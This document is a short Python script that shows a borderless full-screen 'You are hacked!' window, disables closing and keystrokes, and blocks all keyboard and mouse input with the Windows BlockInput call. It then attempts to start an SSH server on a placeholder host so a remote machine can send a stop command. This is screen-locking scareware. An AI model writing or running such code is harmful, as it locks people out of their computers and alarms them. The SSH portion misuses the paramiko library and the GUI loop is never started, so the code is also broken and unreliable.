import tkinter as tk
import ctypes
import paramiko

# Set up the GUI as before
host = 'the admin/customer IP'
user = 'DOMAIN\username'
passwd = 'password'
root = tk.Tk()
root.title("You are hacked!")
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.bind("<Key>", lambda event: None)
root.attributes("-fullscreen", True)
root.resizable(False, False)
root.overrideredirect(True)
label = tk.Label(root, text="You are hacked!", font=("Arial", 24))
label.pack(pady=20)
ctypes.windll.user32.BlockInput(True)

# Set up the SSH server
ssh_server = paramiko.Transport((host, 22))
ssh_server.add_server_key(paramiko.RSA.generate(2048))
ssh_server.allow_agent = False
ssh_server.allow_tcp_forwarding = False
ssh_server.start_server(server=paramiko.ServerInterface())

# Wait for a connection from the Linux machine
channel = ssh_server.accept(10)

# Send a command to stop the Python script and delete the file
channel.send("python stop_script.py")

# Clean up the SSH server and GUI
ssh_server.close()
root.destroy()
